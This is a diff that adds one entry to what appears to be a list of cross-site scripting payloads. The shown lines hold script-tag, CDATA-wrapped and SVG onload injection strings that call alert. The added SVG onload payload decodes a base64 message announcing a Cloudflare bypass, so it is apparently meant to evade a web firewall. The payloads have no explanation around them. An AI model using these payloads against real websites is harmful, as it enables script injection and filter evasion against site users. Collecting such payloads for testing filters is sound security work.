@@ -15,6 +15,7 @@
 <!--%0dalert(1)%0d--><script src="#️⃣"></script>
 🥀//<![CDATA[alert/*️⃣comment*/(1);//]]><script xlink:href="#"></script>
 //<![CDATA[alert/*️⃣comment*/(1);//]]><script xlink:href="#"></script>
+<Svg%20Only=1%20OnLoad=confirm(atob(%27Q2xvdWRmbGFyZSBieXBhc3NlZA==%27))>
 '>+<script>alert(69)</script>
 </<K><Svg Onload=alert(1)>
 </<Kno XSS="><Svg Onload=alert(1)>
